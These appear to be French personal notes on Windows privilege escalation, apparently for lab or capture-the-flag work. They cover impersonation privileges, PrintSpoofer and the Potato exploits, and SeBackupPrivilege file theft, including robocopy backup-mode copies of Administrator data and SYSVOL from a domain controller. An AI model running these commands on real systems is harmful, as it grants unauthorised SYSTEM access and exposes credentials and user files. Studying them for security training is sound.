## Privilèges utiles:
* SeImpersonatePrivilege
* SeBackupPrivilege
* SeAssignPrimaryToken
* SeLoadDriver
* SeDebug
## Comptes utiles:
* LOCAL SERVICE
* NETWORK SERVICE
* SERVICE

# named pipes
Méthode de communication local ou distante inter-processus
Forcer un processus avec privilèges suffisants à se connecter sur un named pipe avec **SeImpersonatePrivilege**

# Outils
## Printspoofer
https://github.com/itm4n/PrintSpoofer
Vérifier que le service roule avant: ```Get-Service Spooler```
vérifier que le pipe ```\\.\pipe\spoolss``` est ouvert: ```(get-childitem \\.\pipe\).FullName```

```
.\printspoofer.exe -i -c cmd
```

Potato (RottenPotato, SweetPotato, Juicy Potato)
https://jlajara.gitlab.io/Potatoes_Windows_Privesc

# SeBackupPrivilege
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
robocopy "\\DC01\C$\users" "C:\users\backupdc012" /lev:5 /s /b
robocopy "\\DC01\C$\users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell" "C:\users\adminpowershell" /lev:5 /s /b
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
On peut éditer les privilèges en copiant tout les policies sur notre machine, éditer puis renvoyer
Doit pouvoir mettre à jour les policies ou redémarrer le PC.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
robocopy "\\DC01\C$\Windows\SYSVOL" ".\SYSVOL" /e /b
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Voir sur internet, pas encore réussi